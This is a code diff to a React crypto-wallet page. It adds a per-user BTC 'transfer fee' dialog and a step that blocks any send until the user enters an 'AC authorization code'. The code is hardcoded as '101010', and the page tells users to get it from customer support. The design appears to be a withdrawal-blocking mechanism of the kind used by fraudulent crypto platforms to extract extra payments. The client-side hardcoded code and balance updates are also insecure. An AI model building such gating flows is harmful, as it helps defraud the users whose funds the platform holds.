@@ -41,6 +41,11 @@ const Crypto = () => {
   const [transactions, setTransactions] = useState<any[]>([]);
   const [showReceipt, setShowReceipt] = useState(false);
   const [currentReceipt, setCurrentReceipt] = useState<any>(null);
+  const [showFeeDialog, setShowFeeDialog] = useState(false);
+  const [showAcDialog, setShowAcDialog] = useState(false);
+  const [acCode, setAcCode] = useState("");
+  const [transferFee, setTransferFee] = useState(0);
+  const [pendingSendData, setPendingSendData] = useState<any>(null);
 
   useEffect(() => {
     const checkUser = async () => {
@@ -365,9 +370,58 @@ const Crypto = () => {
       return;
     }
 
+    // Get user's transfer fee
+    const { data: feeData } = await supabase
+      .from("crypto_transfer_fees")
+      .select("btc_fee")
+      .eq("user_id", user.id)
+      .single();
+
+    const fee = feeData?.btc_fee || 0.0001;
+    setTransferFee(fee);
+    setPendingSendData({ amountNum, wallet, walletAddress });
+    setShowFeeDialog(true);
+  };
+
+  const handleConfirmFee = async () => {
+    setShowFeeDialog(false);
+    setShowAcDialog(true);
+  };
+
+  const handleVerifyAcCode = async () => {
+    if (acCode !== "101010") {
+      toast({
+        title: "Invalid Code",
+        description: "Invalid authorization code. Please reach out to customer support.",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    const { amountNum, wallet, walletAddress } = pendingSendData;
     const coin = CRYPTO_COINS.find(c => c.symbol === selectedCoin.symbol);
     const usdValue = amountNum * (prices[coin!.id]?.usd || 0);
 
+    // Check BTC balance for fee
+    const btcWallet = cryptoWallets.find(w => w.coin_symbol === "BTC");
+    if (!btcWallet || btcWallet.balance < transferFee) {
+      toast({
+        title: "Insufficient BTC",
+        description: `You need ${transferFee} BTC for the transfer fee. Available: ${btcWallet?.balance || 0} BTC`,
+        variant: "destructive"
+      });
+      setShowAcDialog(false);
+      setAcCode("");
+      return;
+    }
+
+    // Deduct BTC fee
+    await supabase
+      .from("crypto_wallets")
+      .update({ balance: btcWallet.balance - transferFee })
+      .eq("id", btcWallet.id);
+
+    // Deduct crypto amount
     const { error: walletError } = await supabase
       .from("crypto_wallets")
       .update({ balance: wallet.balance - amountNum })
@@ -379,19 +433,29 @@ const Crypto = () => {
         description: "Failed to send crypto",
         variant: "destructive"
       });
+      setShowAcDialog(false);
+      setAcCode("");
       return;
     }
 
     const receipt = await createTransaction('send', selectedCoin.symbol, amountNum, usdValue, walletAddress);
     
     if (receipt) {
-      setCurrentReceipt(receipt);
+      setCurrentReceipt({ ...receipt, fee: transferFee });
       setShowReceipt(true);
     }
 
     setAmount("");
     setWalletAddress("");
+    setShowAcDialog(false);
+    setAcCode("");
+    setPendingSendData(null);
     await loadCryptoWallets(user.id);
+
+    toast({
+      title: "Success",
+      description: `Transfer successful! Fee: ${transferFee} BTC`,
+    });
   };
 
   return (
@@ -671,6 +735,51 @@ const Crypto = () => {
           </Card>
         </div>
       </div>
+
+
+      {/* Fee Dialog */}
+      <Dialog open={showFeeDialog} onOpenChange={setShowFeeDialog}>
+        <DialogContent className="sm:max-w-md bg-card">
+          <DialogHeader>
+            <DialogTitle className="text-foreground">Transfer Fee</DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4">
+            <div className="text-center p-6 bg-muted/20 rounded-lg">
+              <p className="text-sm text-muted-foreground mb-2">Transaction Fee</p>
+              <p className="text-3xl font-bold text-foreground">{transferFee} BTC</p>
+            </div>
+            <p className="text-sm text-muted-foreground text-center">
+              This fee will be charged from your BTC balance
+            </p>
+            <Button onClick={handleConfirmFee} className="w-full">Continue</Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* AC Code Dialog */}
+      <Dialog open={showAcDialog} onOpenChange={setShowAcDialog}>
+        <DialogContent className="sm:max-w-md bg-card">
+          <DialogHeader>
+            <DialogTitle className="text-foreground">Authorization Required</DialogTitle>
+          </DialogHeader>
+          <div className="space-y-4">
+            <p className="text-sm text-muted-foreground">
+              Please input the AC authorization code. If you don't have one, reach out to customer support.
+            </p>
+            <div>
+              <Label>6-digit AC Code</Label>
+              <Input 
+                type="text" 
+                maxLength={6}
+                value={acCode}
+                onChange={(e) => setAcCode(e.target.value.replace(/\D/g, ''))}
+                placeholder="Enter AC code"
+              />
+            </div>
+            <Button onClick={handleVerifyAcCode} className="w-full">Verify & Send</Button>
+          </div>
+        </DialogContent>
+      </Dialog>
 
       {/* Receipt Dialog */}
       <Dialog open={showReceipt} onOpenChange={setShowReceipt}>
